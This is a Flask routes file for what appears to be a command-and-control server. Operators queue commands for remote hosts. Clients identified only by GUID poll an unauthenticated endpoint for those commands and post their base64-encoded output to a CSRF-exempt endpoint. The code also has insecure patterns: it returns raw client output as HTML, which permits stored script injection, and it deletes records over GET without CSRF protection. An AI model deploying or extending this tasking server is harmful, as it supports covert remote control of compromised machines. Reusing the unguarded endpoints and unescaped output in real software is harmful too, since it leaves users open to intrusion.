from flask import render_template, url_for, jsonify, redirect, request
from app.task import bp
from flask_login import login_required
from app.main.forms import EmptyForm
from app.models import Task, Host
from app import db
from datetime import datetime
from app import csrf
import base64

@bp.route('/task-list', methods=['GET', 'POST'])
@login_required
def task_list():
    """
    Renders Task list page
    """
    form = EmptyForm()
    date_format = "%d.%m.%Y:%H:%M:%S"
    data = [
        [
            t.id, t.guid, 
            datetime.strftime(t.time, date_format),
            t.task_type, t.status
        ] for t in db.session.query(Task).all()]
    #print(response)
    return render_template('task_list.html', title='Task-List', route="task", form=form, data=data)


@bp.route('/task_delete/<int:pk>', methods=['GET'])
@login_required
def task_delete(pk):
    """
    Delete a task and redirects to Task listing page
    """
    #form = EmptyForm(request.form)
    if request.method == 'GET':
        obj = Task.query.get(pk)
        db.session.delete(obj)
        db.session.commit()
        return redirect(url_for('task.task_list'))


@bp.route('/task_view/<int:pk>', methods=['GET'])
@login_required
def task_view(pk):
    """
    Presents the output of a task back to the user
    """
    if request.method == 'GET':
        obj = Task.query.get(pk)
        result = obj.output
        if len(result) == 0:
            return '<h5>Error no output</h5>'
        else:
            return result


@bp.route('/new/<guid>', methods=['GET'])
def newtask(guid=None):
    """
    Sends new task to client
    """
    if request.method == 'GET':
        status = Host.query.filter_by(guid=guid).first()
        status.status = "Online"
        db.session.commit()
        objects = Task.query.filter_by(guid=guid, status ="new").all()
        results = [
            {
                "task_type": object.task_type,
                "argument": object.command,
                "task_id": object.id
            } for object in objects
        ]
        response = {"tasks": results}
        return jsonify(response)


@bp.route('/newupload/<guid>/<taskid>', methods=['POST'])
@csrf.exempt #disable csrf on this function
def receive_data(guid=None,taskid=None):
    """
    receives data from client and add it to database
    """
    if request.method == 'POST':
        command = base64.b64decode(request.form.get('data'))
        print(command)
        obj = Task.query.get(taskid)
        obj.guid = guid
        obj.status = "Executed"
        obj.output = command
        db.session.commit()
        return "OK"
